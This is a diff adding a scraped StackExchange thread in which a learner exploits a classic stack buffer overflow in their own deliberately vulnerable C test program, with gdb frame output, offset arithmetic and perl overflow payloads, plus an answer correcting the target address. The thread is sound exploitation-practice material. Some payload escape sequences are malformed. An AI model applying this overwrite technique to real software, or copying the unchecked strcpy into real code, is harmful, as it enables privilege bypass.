@@ -1,0 +1,50 @@
+{
+    "title": "Writing an exploit for sample-application",
+    "link": "https://reverseengineering.stackexchange.com/questions/11020/writing-an-exploit-for-sample-application",
+    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I understand the principles of exploiting a classical stack-based buffer-overflow, and now I want to practice it. Therefore I wrote the following test-application:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid public(char *args) {\n    char buff[12];\n    memset(buff, 'B', sizeof(buff));\n\n    strcpy(buff, args);\n    printf(\"\\nbuff: [%s] (%p)(%d)\\n\\n\", &amp;buff, buff, sizeof(buff));\n}\n\nvoid secret(void) {\n    printf(\"SECRET\\n\");\n    exit(0);\n}\n\nint main(int argc, char *argv[]) {\n    int uid;\n    uid = getuid();\n\n    // Only when the user is root\n    if (uid == 0)\n        secret();\n\n    if (argc &gt; 1) {\n        public(argv[1]);\n    }\n    else\n        printf(\"Kein Argument!\\n\");\n}\n</code></pre>\n<p>When the user which starts the program is <em>root</em>, the method <code>secret()</code> is being called, <em>otherwise</em>, the method <code>public(...)</code> is being called.\nI am using debian-gnome x64, so I had to compile it specifically to x86 to get x86-assembly (which I know better than x64).\nI compiled the program with gcc: <code>gcc ret.c -o ret -m32 -g -fno-stack-protector</code></p>\n<hr/>\n<p><strong>Target:</strong>\nI want to call the method <code>secret()</code> without being a <em>root-user</em>. <em>{To do that I have to overwrite the <code>R</code>eturn <code>I</code>nstruction <code>P</code>ointer (<code>RIP</code>) with the address of the function <code>secret()</code>}</em></p>\n<p><strong>Vulnerability:</strong>\nThe method <code>public(...)</code> copies the program-args with the unsafe <code>strcpy()</code> method into the <code>char-array</code> <strong>buff</strong>. So it is possible to overwrite data on the stack, when the user starts the program with an <em>arg &gt; 11</em>, where <em>arg</em> should be the length of the string-arg.</p>\n<p><strong>Required Information:</strong></p>\n<ul>\n<li>The address of the function <code>secret()</code>.</li>\n<li>The address of the first buffer's first element. Due to <code>ASCII</code>-Encoding I know that each <code>char</code> has a size of <code>1 byte</code>, so that the buffer's last element is <code>12 bytes</code> ahead the first element.</li>\n<li>The address of the <code>RIP</code>, because I have to overwrite it <code>secret()</code>s address.</li>\n<li><em>OPTIONAL: It also helps to know the address of the <code>S</code>afed <code>F</code>rame <code>P</code>ointer (<code>SFP</code>).</em></li>\n</ul>\n<p><strong>Methodical approach:</strong></p>\n<ul>\n<li>Load the program into <code>gdb</code>: <code>gdb -q ret</code>.</li>\n<li>To get an overview of the full stack-frame of the method <code>public(...)</code> I have to set a breakpoint there, where the <code>function-epilogue</code> starts. This is at the enclosing brace <code>}</code> at line <code>11</code>.</li>\n<li>Now I have to run the program with a valid arg: <code>run A</code>.</li>\n<li><p>At the breakpoint, I now want to view the stack-frame.</p>\n<pre><code>(gdb) info frame 0\nStack frame at 0xffffd2f0:\n eip = 0x804852d in public (ret.c:11); saved eip = 0x804858c\n called by frame at 0xffffd330\n source language c.\n Arglist at 0xffffd2e8, args: args=0xffffd575 \"A\"\n Locals at 0xffffd2e8, Previous frame's sp is 0xffffd2f0\n Saved registers:\n  ebp at 0xffffd2e8, eip at 0xffffd2ec\n</code></pre>\n<p>Because from that I can gather the following information:</p>\n<ul>\n<li>The <code>RIP</code> is located at <code>0xffffd2ec</code> and contains the address <code>0x804858c</code> which contains the instruction <code>0x804858c &lt;main+61&gt;: add    $0x10,%esp</code>.</li>\n<li>The <code>SFP</code> is located at <code>0xffffd2e8</code>.</li>\n<li><p>Now I need the address, where the <code>secret()</code>-function starts:</p>\n<p>(gdb) print secret\n$2 = {void (void)} 0x804852f </p></li>\n</ul></li>\n<li><p>Last, but not least I get the buffer's address:</p>\n<pre><code>(gdb) print/x &amp;buff\n$4 = 0xffffd2d4\n</code></pre></li>\n<li><p>To sum it up:</p>\n<ul>\n<li><code>RIP</code> is at <code>0xffffd2ec</code>.</li>\n<li><code>SFP</code> is at <code>0xffffd2e8</code>.</li>\n<li><code>buff</code> is at <code>0xffffd2d4</code>.</li>\n</ul></li>\n</ul>\n<p>This means that I would have to run the program with <code>0xffffd2ec</code> - <code>0xffffd2d4</code> + <code>0x04</code> = <code>28 bytes</code> (= <code>char</code>s).</p>\n<p>So, to exploit it I'd have to run the program with an arg which is <code>28 bytes</code> long whereas the last <code>4 bytes</code> contain the address of the function <code>secret()</code> (and pay attention to little-endian-ordering):</p>\n<pre><code>(gdb) run `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/patrick/Projekte/C/I. Stack_Overflow/ret `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\n\nbuff: [AAAAAAAAAAAAAAAAAAAAAAAA�d2\n                                  f\n                                   f] (0xffffd2b4)(12)\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0c3264ec in ?? ()\n</code></pre>\n<p>Two questions are rising up:</p>\n<ul>\n<li><p>Why is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....</p></li>\n<li><p>Why is between <code>buff</code> and the <code>SFP</code> a <code>8-byte</code> gap? What does this memory-area contain?</p></li>\n</ul>\n<p><strong>EDIT: <a href=\"https://drive.google.com/file/d/0BxV4F9km7MRVa0RKOGk5T3c2UVE/view?usp=sharing\" rel=\"noreferrer\">That's</a> a download-link to the binary.</strong></p>\n</div>",
+    "votes": "5",
+    "answers": 1,
+    "views": "3k",
+    "tags": [
+        "c++",
+        "gdb",
+        "c",
+        "exploit",
+        "stack"
+    ],
+    "user": "JDoens",
+    "time": "Oct 4, 2015 at 22:58",
+    "comments": [
+        {
+            "user": "Jason Geffner",
+            "text": "<span class=\"comment-copy\">It would help if you could provide a link to the binary.</span>",
+            "time": null
+        },
+        {
+            "user": "JDoens",
+            "text": "<span class=\"comment-copy\">Thanks that you want to help me! <a href=\"https://drive.google.com/file/d/0BxV4F9km7MRVa0RKOGk5T3c2UVE/view?usp=sharing\" rel=\"nofollow noreferrer\">That's the link</a> to the binary.</span>",
+            "time": null
+        }
+    ],
+    "answers_data": [
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<blockquote>\n<ul>\n<li>Why is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....</li>\n</ul>\n</blockquote>\n<p>It's because you're overwriting the return address on the stack with <code>0xffffd2ec</code> instead of <code>0x0804852f</code> (the latter is the address for <code>secret()</code>).</p>\n<p>If you thus use <code>'{print \"A\"x24; print \"\\x2f\\85\\04\\08\"; }'</code> instead, it should work.</p>\n<blockquote>\n<ul>\n<li>Why is between <code>buff</code> and the <code>SFP</code> a <code>8-byte</code> gap? What does this memory-area contain?</li>\n</ul>\n</blockquote>\n<p>That gap is probably because of attempted optimizations made by gcc. The memory-area contains nothing (well, technically it contains 8 bytes whose values are indeterminate) and the code in the <code>public()</code> function neither reads from nor writes to that memory-area.</p>\n</div>",
+            "votes": "5",
+            "user": "Jason Geffner",
+            "time": "Oct 4, 2015 at 23:49",
+            "is_accepted": true,
+            "comments": [
+                {
+                    "user": "JDoens",
+                    "text": "<span class=\"comment-copy\">Thanks! You are right, I did not overwrite the <code>RIP</code> with <code>secret()</code>s address. But you forgot to reverse the byte-order (it's little-endian).</span>",
+                    "time": null
+                },
+                {
+                    "user": "Jason Geffner",
+                    "text": "<span class=\"comment-copy\">Good catch; just fixed the byte-order.</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
